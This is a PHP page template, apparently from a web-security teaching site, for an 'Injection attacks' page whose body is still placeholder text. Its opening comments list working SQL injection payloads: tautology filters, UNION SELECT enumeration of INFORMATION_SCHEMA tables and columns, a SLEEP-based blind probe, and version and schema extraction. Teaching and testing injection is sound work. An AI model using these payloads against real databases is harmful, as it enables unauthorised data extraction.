<?php

  require_once "templates/header.php";

  //%' OR '%
  //%' OR '1' = '1
  //prints everything

  //sql' OR title LIKE 'cross
  //prints cross-site scripting

  //' union select title FROM home_buttons -- '
  //title can be replaced with php_page, id, etc

  //sql' OR title LIKE 'cross
  //prints cross-site scripting

  //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_TABLES -- '
  //prints names of all tables

  //sleep
  //sql'  UNION SELECT SLEEP(3)-- '

  //gets columns of home table (43 from TABLE_ID in SYS_TABLES)
  //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_COLUMNS WHERE TABLE_ID = '43' -- '

  //gets db version
  //%sql' UNION SELECT version()-- '

  //gets schema of current
  //%sql' UNION SELECT schema()-- '
 ?>


<html>
  <head>
    <link rel="stylesheet" type="text/css" href="/public/assets/css/page_template.css">
    <link rel="stylesheet" type="text/css" href="/public/assets/css/sql-injection.css">
  </head>
  <body>

  <div class="video-container">
    <video autoplay muted loop class="default-vid">
      <source src="/img/video/sql-injection.mp4" type="video/mp4">
    </video>
  </div>
  <div class="colour-overlay"></div>

    <div class="subheadings">
      <h1>Injection attacks</h1>
      <!-- Blind | exploits | second order (Maybe as buttons)-->
      <p>Blind injection</p>
      <p>Information schema exploits</p>
      <p>Second order injection</p>
      <!-- Paragraph explaining sql -->
    </div>
    <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
    <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
    <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>

  </body>
</html>
